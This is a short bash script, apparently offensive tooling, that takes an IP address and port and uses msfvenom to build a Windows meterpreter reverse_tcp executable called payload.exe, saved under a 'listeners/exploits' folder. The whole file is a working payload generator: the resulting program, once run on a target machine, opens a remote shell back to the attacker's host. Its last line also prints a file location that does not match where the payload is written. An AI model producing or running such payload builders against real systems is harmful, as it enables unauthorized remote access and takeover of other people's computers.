#!/bin/bash


if [ $# -eq 0 ]; then
    echo "No argument supplied"
    exit 1
fi


ip_addr=$1
port=$2
echo $ip_addr
echo $port


msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$port -f exe > /home/nidharsan/listeners/exploits/payload.exe

if [ $? -ne 0 ]; then
    echo "Failed to generate payload file"
    exit 1
fi

echo "Payload file 'payload.exe' generated successfully."
echo "Location: $(pwd)/payload.exe"
